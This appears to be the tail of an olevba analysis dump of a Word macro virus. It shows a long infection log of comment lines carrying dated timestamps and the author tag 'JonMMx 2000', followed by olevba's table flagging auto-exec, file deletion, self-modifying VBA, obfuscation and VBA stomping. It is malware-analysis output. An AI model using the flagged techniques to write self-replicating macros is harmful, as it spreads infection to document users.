' Line #201:
' Line #202:
' Line #203:
' Line #204:
' 	QuoteRem 0x0000 0x0029 " 04:14:154:14:15 PM PM-Friday, 1 Oct 1999"
' Line #205:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #206:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' 	QuoteRem 0x0000 0x002B " 08:43:128:43:12 AM AM-Saturday, 2 Oct 1999"
' Line #212:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #213:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #214:
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' 	QuoteRem 0x0000 0x0025 " 03:37:3915:37:39 -Kamis, 21 Okt 1999"
' Line #219:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #220:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' 	QuoteRem 0x0000 0x0025 " 05:53:5617:53:56 -Kamis, 21 Okt 1999"
' Line #226:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #227:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' Line #232:
' 	QuoteRem 0x0000 0x0025 " 11:17:5611:17:56 -Jumat, 22 Okt 1999"
' Line #233:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #234:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #235:
' Line #236:
' Line #237:
' Line #238:
' Line #239:
' 	QuoteRem 0x0000 0x0028 " 08:35:2520:35:25  PM-Sabtu, 23 Okt 1999"
' Line #240:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #241:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' Line #246:
' 	QuoteRem 0x0000 0x0028 " 03:19:1715:19:17  PM-Sabtu, 30 Okt 1999"
' Line #247:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #248:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' Line #253:
' 	QuoteRem 0x0000 0x0029 " 07:26:4219:26:42  PM-Minggu, 31 Okt 1999"
' Line #254:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #255:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #256:
' Line #257:
' Line #258:
' Line #259:
' Line #260:
' 	QuoteRem 0x0000 0x0024 " 02:33:3914:33:39 -Senin, 1 Nop 1999"
' Line #261:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #262:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #263:
' Line #264:
' Line #265:
' Line #266:
' Line #267:
' 	QuoteRem 0x0000 0x0023 " 03:59:3715:59:37 -Rabu, 3 Nop 1999"
' Line #268:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #269:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #270:
' Line #271:
' Line #272:
' Line #273:
' Line #274:
' 	QuoteRem 0x0000 0x002A " 01:17:311:17:31 PM PM-Tuesday, 4 May 1999"
' Line #275:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #276:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #277:
' Line #278:
' Line #279:
' Line #280:
' Line #281:
' 	QuoteRem 0x0000 0x0029 " 01:23:511:23:51 PM PM-Monday, 8 Nov 1999"
' Line #282:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #283:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #284:
' Line #285:
' Line #286:
' Line #287:
' Line #288:
' 	QuoteRem 0x0000 0x002A " 09:12:189:12:18 AM AM-Monday, 15 Nov 1999"
' Line #289:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #290:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #291:
' Line #292:
' Line #293:
' Line #294:
' Line #295:
' 	QuoteRem 0x0000 0x002D " 11:18:2011:18:20 PM PM-Wednesday, 1 Sep 1999"
' Line #296:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #297:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #298:
' Line #299:
' Line #300:
' Line #301:
' Line #302:
' 	QuoteRem 0x0000 0x002C " 10:32:4810:32:48 PM PM-Tuesday, 30 Nov 1999"
' Line #303:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #304:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #305:
' Line #306:
' Line #307:
' Line #308:
' Line #309:
' 	QuoteRem 0x0000 0x002B " 09:19:5709:19:57 pm pm-Friday, 17 Dec 1999"
' Line #310:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #311:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #312:
' Line #313:
' Line #314:
' Line #315:
' Line #316:
' 	QuoteRem 0x0000 0x002A " 01:04:11:04:01 PM PM-Thursday, 3 Jan 1980"
' Line #317:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #318:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #319:
' Line #320:
' Line #321:
' Line #322:
' Line #323:
' 	QuoteRem 0x0000 0x002B " 04:32:294:32:29 AM AM-Tuesday, 25 Jan 2000"
' Line #324:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #325:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #326:
' Line #327:
' Line #328:
' Line #329:
' Line #330:
' 	QuoteRem 0x0000 0x002B " 11:27:1511:27:15 PM PM-Sunday, 30 Jan 2000"
' Line #331:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #332:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #333:
' Line #334:
' Line #335:
' Line #336:
' Line #337:
' 	QuoteRem 0x0000 0x002B " 04:58:534:58:53 PM PM-Thursday, 2 Mar 2000"
' Line #338:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #339:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #340:
' Line #341:
' Line #342:
' Line #343:
' Line #344:
' 	QuoteRem 0x0000 0x0029 " 03:56:233:56:23 PM PM-Friday, 3 Mar 2000"
' Line #345:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #346:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #347:
' Line #348:
' Line #349:
' Line #350:
' Line #351:
' 	QuoteRem 0x0000 0x002A " 09:51:489:51:48 PM PM-Sunday, 18 Jun 2000"
' Line #352:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #353:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #354:
' Line #355:
' Line #356:
' Line #357:
' Line #358:
' 	QuoteRem 0x0000 0x002A " 01:06:561:06:56 PM PM-Monday, 19 Jun 2000"
' Line #359:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #360:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #361:
' Line #362:
' Line #363:
' Line #364:
' Line #365:
' 	QuoteRem 0x0000 0x002C " 08:49:268:49:26 PM PM-Thursday, 29 Jun 2000"
' Line #366:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #367:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #368:
' Line #369:
' Line #370:
' Line #371:
' Line #372:
' 	QuoteRem 0x0000 0x002A " 08:03:320:03:03  PM-Thursday, 13 Jul 2000"
' Line #373:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #374:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #375:
' Line #376:
' Line #377:
' Line #378:
' Line #379:
' 	QuoteRem 0x0000 0x002B " 03:59:303:59:30 PM PM-Thursday, 3 Aug 2000"
' Line #380:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #381:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #382:
' Line #383:
' Line #384:
' Line #385:
' Line #386:
' 	QuoteRem 0x0000 0x002A " 03:35:563:35:56 PM PM-Tuesday, 3 Oct 2000"
' Line #387:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #388:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #389:
' Line #390:
' Line #391:
' Line #392:
' Line #393:
' 	QuoteRem 0x0000 0x002B " 04:54:34:54:03 PM PM-Thursday, 12 Oct 2000"
' Line #394:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #395:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #396:
' Line #397:
' Line #398:
' Line #399:
' Line #400:
' 	QuoteRem 0x0000 0x002B " 12:31:2212:31:22 PM PM-Monday, 27 Nov 2000"
' Line #401:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #402:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #403:
' Line #404:
' Line #405:
' Line #406:
' Line #407:
' 	QuoteRem 0x0000 0x002D " 11:11:3011:11:30 AM AM-Thursday, 14 Dec 2000"
' Line #408:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #409:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #410:
' Line #411:
' Line #412:
' Line #413:
' Line #414:
' 	QuoteRem 0x0000 0x002A " 10:18:5410:18:54 AM AM-Monday, 8 Jan 2001"
' Line #415:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #416:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #417:
' Line #418:
' Line #419:
' Line #420:
' Line #421:
' 	QuoteRem 0x0000 0x002C " 04:26:524:26:52 PM PM-Thursday, 22 Feb 2001"
' Line #422:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #423:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #424:
' Line #425:
' Line #426:
' Line #427:
' Line #428:
' 	QuoteRem 0x0000 0x0029 " 03:28:83:28:08 PM PM-Monday, 26 Feb 2001"
' Line #429:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #430:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #431:
' Line #432:
' Line #433:
' Line #434:
' Line #435:
' 	QuoteRem 0x0000 0x0029 " 01:48:61:48:06 PM PM-Monday, 16 Apr 2001"
' Line #436:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #437:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #438:
' Line #439:
' Line #440:
' Line #441:
' Line #442:
' 	QuoteRem 0x0000 0x002C " 04:28:334:28:33 PM PM-Wednesday, 9 May 2001"
' Line #443:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #444:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #445:
' Line #446:
' Line #447:
' Line #448:
' Line #449:
' 	QuoteRem 0x0000 0x0026 " 08:49:808:49:08 -tirsdag, 26 jun 2001"
' Line #450:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #451:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #452:
' Line #453:
' Line #454:
' Line #455:
' Line #456:
' 	QuoteRem 0x0000 0x0029 " 01:29:561:29:56 PM PM-Monday, 2 Jul 2001"
' Line #457:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #458:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #459:
' Line #460:
' Line #461:
' Line #462:
' Line #463:
' 	QuoteRem 0x0000 0x0031 " 07:41:519:41:05 Grunge Grunge-Friday, 6 Jul 2001"
' Line #464:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #465:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #466:
' Line #467:
' Line #468:
' Line #469:
' Line #470:
' 	QuoteRem 0x0000 0x0029 " 11:19:5523:19:55  odp.-úterý, 12 VI 2001"
' Line #471:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #472:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #473:
' Line #474:
' Line #475:
' Line #476:
' Line #477:
' 	QuoteRem 0x0000 0x0026 " 10:33:3410:33:34 -Freitag, 7 Sep 2001"
' Line #478:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #479:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #480:
' Line #481:
' Line #482:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

